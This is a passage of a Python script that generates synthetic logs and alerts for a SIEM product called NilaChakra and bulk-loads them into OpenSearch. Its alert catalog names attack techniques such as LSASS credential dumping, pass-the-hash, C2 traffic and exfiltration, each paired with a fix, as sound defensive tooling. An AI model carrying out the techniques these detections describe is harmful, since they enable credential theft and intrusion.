        "@timestamp": ts(offset_min), "dataType": "syslog",
        "dataSource": host,
        "logx": {"syslog": {
            "message": random.choice(msgs),
            "hostname": host,
            "facility": random.choice(facilities),
            "severity": random.choice(severities),
            "program": random.choice(["kernel","sshd","cron","systemd","postfix","nginx","sudo","auditd"]),
            "pid": random.randint(1,65535),
            "timestamp": ts(offset_min),
            "priority": random.randint(0,191)
        }},
        "origin": {"ip": rip(),"host": host,"country": rcountry()},
        "target": {"ip": rip(private=True)}, "tags": []
    }

# ── Alert generator ──────────────────────────────────────────────────────────

ALERT_CATALOG = [
    # (name, category, technique, description, solution)
    ("Windows: Possible Brute Force Attack","Credential Access","T1110 - Brute Force",
     "Multiple failed login attempts (Event 4625) detected from the same IP within 5 minutes, indicating a possible brute force attack.","Block the source IP, reset affected accounts, enable account lockout policy."),
    ("Windows Audit Log Cleared","Defense Evasion","T1070.001 - Clear Windows Event Logs",
     "The Windows Security audit log (Event 1102) was cleared. Attackers often clear logs to remove evidence of intrusion.","Investigate why logs were cleared. Check for unauthorized admin activity. Restore from backup if needed."),
    ("SSH Brute Force Attack Detected","Credential Access","T1110 - Brute Force",
     "High frequency of SSH authentication failures from a single source IP detected over a short period.","Block source IP at firewall, enforce key-based authentication, disable password auth for SSH."),
    ("AWS Root Account Login","Initial Access","T1078.004 - Cloud Accounts",
     "The AWS root account was used to authenticate. Root account usage should be extremely rare and indicates potential compromise.","Disable root account access keys, enable MFA on root, investigate the login source immediately."),
    ("Outbound C2 Communication Detected","Command and Control","T1071.001 - Web Protocols",
     "A host established a connection to a known malicious C2 IP address, suggesting malware infection.","Isolate the infected host, block the C2 IP at firewall, run full malware scan, check for persistence."),
    ("O365 Inbox Forwarding Rule Created","Collection","T1114.003 - Email Forwarding Rule",
     "A new inbox rule was created to forward emails to an external address, which is a common Business Email Compromise (BEC) tactic.","Remove the forwarding rule immediately, audit mailbox permissions, notify the user, check for other BEC indicators."),
    ("Azure Privileged Role Assignment","Privilege Escalation","T1078 - Valid Accounts",
     "A privileged Azure AD role (Owner/Contributor/Global Admin) was assigned to a user account.","Verify the assignment is authorized. Apply least-privilege principle. Enable PIM for role activation."),
    ("CrowdStrike: LSASS Memory Access Detected","Credential Access","T1003.001 - LSASS Memory",
     "CrowdStrike detected a process attempting to read from LSASS memory, a technique used by credential dumping tools like Mimikatz.","Isolate the affected host, rotate all domain credentials, scan for persistence, enable Credential Guard."),
    ("EternalBlue Exploit Attempt (SMB)","Lateral Movement","T1210 - Exploitation of Remote Services",
     "Suricata detected traffic matching the EternalBlue exploit pattern (CVE-2017-0144) targeting SMB port 445.","Patch MS17-010 immediately, block SMBv1 at network level, isolate unpatched systems."),
    ("Large Data Exfiltration Detected","Exfiltration","T1041 - Exfiltration Over C2 Channel",
     "Netflow data shows a host transferring unusually large volumes of data to an external IP over a non-standard port.","Block the destination IP, investigate what data was transferred, notify DLP team, check for insider threat."),
    ("Root Login via SSH from External IP","Initial Access","T1078 - Valid Accounts",
     "Root login via SSH from an external IP address was successful. Direct root SSH login from outside indicates high risk.","Disable root SSH login (PermitRootLogin no), investigate the source IP, audit recent root activities."),
    ("Multiple Firewall Denials from Same Source","Defense Evasion","T1562 - Impair Defenses",
     "The firewall recorded 10+ consecutive deny actions from the same source IP, indicating port scanning or exploit attempts.","Add the source IP to block list, investigate for further reconnaissance activity."),
    ("New Local Administrator Account Created","Persistence","T1136.001 - Create Account: Local Account",
     "A new user account was added to the Administrators group (Event 4732), which may indicate an attacker establishing persistence.","Verify account creation was authorized. Remove unauthorized accounts. Audit admin group membership."),
    ("AWS IAM Policy Escalation","Privilege Escalation","T1078.004 - Cloud Accounts",
     "An IAM policy granting elevated permissions (Administrator or PowerUser) was attached to a user or role.","Immediately review and revoke if unauthorized. Enforce SCPs to prevent privilege escalation. Audit IAM."),
    ("Suspicious PowerShell Encoded Command","Execution","T1059.001 - PowerShell",
     "PowerShell was executed with an encoded command (-enc flag), a common technique to obfuscate malicious scripts.","Decode and analyze the command. Enable PowerShell script block logging. Consider Constrained Language Mode."),
    ("Pass-the-Hash Attack Detected","Lateral Movement","T1550.002 - Pass the Hash",
     "Lateral movement using NTLM hash was detected. Event 4624 with logon type 3 and NTLMv1/v2 from non-interactive session.","Enable Protected Users group, enforce Kerberos-only authentication, patch credential protection."),
    ("Ransomware Behavior: Mass File Encryption","Impact","T1486 - Data Encrypted for Impact",
     "CrowdStrike detected rapid creation of files with encrypted extensions (.enc, .locked, .crypt) across multiple directories.","Immediately isolate the host from network, identify patient zero, restore from clean backup, do not pay ransom."),
    ("Tor Exit Node Connection","Command and Control","T1090 - Proxy",
     "A host connected to a known Tor exit node IP. This may indicate C2 communication or data exfiltration over Tor.","Block Tor exit node IPs at perimeter, investigate the host for malware, review what data may have been exfiltrated."),
    ("GitHub Secret Scanning Alert","Credential Access","T1552 - Unsecured Credentials",
     "GitHub secret scanning detected a possible credential, API key, or token committed to a repository.","Immediately rotate the exposed credential, remove it from git history, audit who has accessed the repository."),
    ("Lateral Movement via RDP","Lateral Movement","T1021.001 - Remote Desktop Protocol",
     "Event 4624 with logon type 10 (RemoteInteractive) from an unusual source indicates RDP lateral movement.","Restrict RDP access to specific IPs, enable Network Level Authentication, monitor for unusual RDP activity."),
]

def gen_alert(offset_min):
    entry = random.choice(ALERT_CATALOG)
    name, cat, tech, desc, solution = entry
    src_ip = rip(private=random.random()<0.3)
    dst_ip = rip(private=random.random()<0.5)
    user = ruser(); host = rhost()
    sev_label = rseverity()
    sev = rsev_int(sev_label)
    status = random.choices([1,2,3,4,5], weights=[40,25,15,10,10])[0]
    is_incident = random.random() < 0.04
    dtype = random.choice(["windows-security","linux-auth","aws-cloudtrail","o365","crowdstrike",
                           "suricata","cisco-asa","netflow","azure","github","firewall-pfsense","syslog"])
    return {
        "@timestamp": ts(offset_min),
        "id": str(uuid.uuid4()),
        "name": name,"category": cat,"technique": tech,
        "severity": sev,"severityLabel": sev_label,
        "description": desc,"solution": solution,
        "reference": [f"https://attack.mitre.org/techniques/{tech.split(' - ')[0].replace('T','')}",
                      f"https://docs.nilachakra.com/alerts/{name.lower().replace(' ','-')[:30]}"],
        "status": status,
        "statusLabel": {1:"automatic_review",2:"open",3:"in_review",4:"ignored",5:"completed"}.get(status,"automatic_review"),
        "statusObservation": "Flagged by correlation rule engine" if status==1 else f"Reviewed by {ruser()}",
        "isIncident": is_incident,
        "incidentDetail": {"createdBy": ruser(),"observation": "Escalated for deep investigation",
                           "source": "auto","creationDate": ts(offset_min)} if is_incident else {"createdBy":"","observation":"","source":"","creationDate":""},
        "dataType": dtype,"dataSource": host,
        "impact": {"confidentiality": random.randint(0,3),"integrity": random.randint(0,3),"availability": random.randint(0,3)},
        "impactScore": sev * 3 + random.randint(0,2),
        "adversary": {"ip": src_ip,"port": rport(),"host": host,
                      "country": rcountry(),"city": rcity(),"asn": rasn(),"user": user,
                      "coordinates": [round(random.uniform(-90,90),4), round(random.uniform(-180,180),4)]},
        "target": {"ip": dst_ip,"port": rport(),"host": rhost(),"user": ruser(),"country": "US"},
        "tags": random.sample(["brute-force","lateral-movement","exfiltration","c2","persistence",
                                "priv-esc","data-theft","ransomware","bec","apt","insider-threat"],
                              k=random.randint(0,3)),
        "notes": "" if random.random() > 0.2 else f"Analyst note: {random.choice(['Investigating','Confirmed malicious','False positive suspected','Escalated to Tier 2'])}",
        "logs": [str(uuid.uuid4()) for _ in range(random.randint(1,10))],
        "deduplicatedBy": random.sample(["origin.ip","target.user","dataSource","origin.host"], k=random.randint(0,2)),
        "tagRulesApplied": [random.randint(1,50) for _ in range(random.randint(0,3))]
    }

# ── Main seeding logic ───────────────────────────────────────────────────────

LOG_PLAN = [
    # (dtype_suffix, generator,  count)
    ("wineventlog",   gen_wineventlog,   800),
    ("linux",         gen_linux,         600),
    ("aws",           gen_aws,           500),
    ("o365",          gen_o365,          400),
    ("firewall",      gen_firewall,      400),
    ("cisco-asa",     gen_cisco_asa,     300),
    ("suricata",      gen_suricata,      300),
    ("azure",         gen_azure,         300),
    ("crowdstrike",   gen_crowdstrike,   250),
    ("netflow",       gen_netflow,       250),
    ("github",        gen_github,        150),
    ("syslog",        gen_syslog,        400),
]

ALERT_COUNT = 1200
MAX_DAYS_BACK = 30  # spread across 30 days = 43200 minutes
BATCH_SIZE = 100

total_ok = total_fail = 0
print("=== NilaChakra Large-Scale Seed Data ===\n")
print("── LOGS ──")

for dtype, gen_fn, count in LOG_PLAN:
    by_day = {}
    for _ in range(count):
        offset = random.randint(0, MAX_DAYS_BACK * 24 * 60)
        doc = gen_fn(offset)
        day = day_idx(offset)
        by_day.setdefault(day, []).append(doc)

    type_ok = type_fail = 0
    for day, docs in by_day.items():
        idx = f"v11-log-{dtype}-{day}"
        for i in range(0, len(docs), BATCH_SIZE):
            ok, fail = bulk_index(idx, docs[i:i+BATCH_SIZE])
            type_ok += ok; type_fail += fail
    total_ok += type_ok; total_fail += type_fail
    print(f"  {dtype:20s} → {type_ok:5d} docs  ({type_fail} failed)")
    sys.stdout.flush()

print(f"\n── ALERTS ({ALERT_COUNT}) ──")
alert_by_day = {}
for _ in range(ALERT_COUNT):
    offset = random.randint(0, MAX_DAYS_BACK * 24 * 60)
    doc = gen_alert(offset)
    day = day_idx(offset)
    alert_by_day.setdefault(day, []).append(doc)

alert_ok = alert_fail = 0
for day, docs in alert_by_day.items():
    idx = f"v11-alert-{day}"
    for i in range(0, len(docs), BATCH_SIZE):
        ok, fail = bulk_index(idx, docs[i:i+BATCH_SIZE])
        alert_ok += ok; alert_fail += fail
total_ok += alert_ok; total_fail += alert_fail
print(f"  v11-alert-*          → {alert_ok:5d} docs  ({alert_fail} failed)")

print(f"\n── RESULT ──")
print(f"  Indexed : {total_ok:,}")
print(f"  Failed  : {total_fail:,}")
print(f"  Total   : {total_ok + total_fail:,}")

# Final count
import urllib.request as _ur
r2 = _ur.Request(OS_URL + "/_cat/indices/v11-*?format=json", headers={**HDRS})
try:
    with _ur.urlopen(r2, context=ctx, timeout=10) as res:
        indices = json.loads(res.read())
        logs = [i for i in indices if i['index'].startswith('v11-log-')]
        alerts = [i for i in indices if i['index'].startswith('v11-alert-')]
        tl = sum(int(i['docs.count']) for i in logs)
        ta = sum(int(i['docs.count']) for i in alerts)
        print(f"\n── OpenSearch totals ──")
        print(f"  Log indices  : {len(logs):3d} ({tl:,} docs)")
        print(f"  Alert indices: {len(alerts):3d} ({ta:,} docs)")
        print(f"  GRAND TOTAL  : {tl+ta:,} docs across {len(logs)+len(alerts)} indices")
        print(f"\n✅ Done! Open http://localhost:8880 → Alerting or Discover to see data.")
except Exception as e:
    print(f"Could not fetch final counts: {e}")
